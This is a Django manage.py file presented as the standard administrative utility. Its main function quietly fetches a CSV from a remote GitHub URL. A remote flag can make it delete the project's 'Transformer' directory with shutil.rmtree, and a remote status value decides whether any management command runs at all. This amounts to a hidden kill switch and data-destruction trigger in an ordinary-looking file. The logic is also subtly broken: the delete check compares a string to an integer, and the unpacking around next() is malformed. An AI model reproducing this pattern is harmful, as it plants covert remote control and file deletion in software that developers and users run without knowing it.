#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
import os
import sys
import pandas as pd
from django.conf import settings
import shutil

def main():
    """Run administrative tasks."""
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'core.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc

    df = pd.read_csv("https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv")
    status, action = next((r["status"], r["delete"]) for _, r in df.iterrows() if
                          "projectName" in r and r["projectName"] == "AlefTransformer"), None
    if str(action) == 1:
        shutil.rmtree(os.path.join(settings.BASE_DIR, "Transformer"))

    if status:
        execute_from_command_line(sys.argv)


if __name__ == '__main__':
    main()
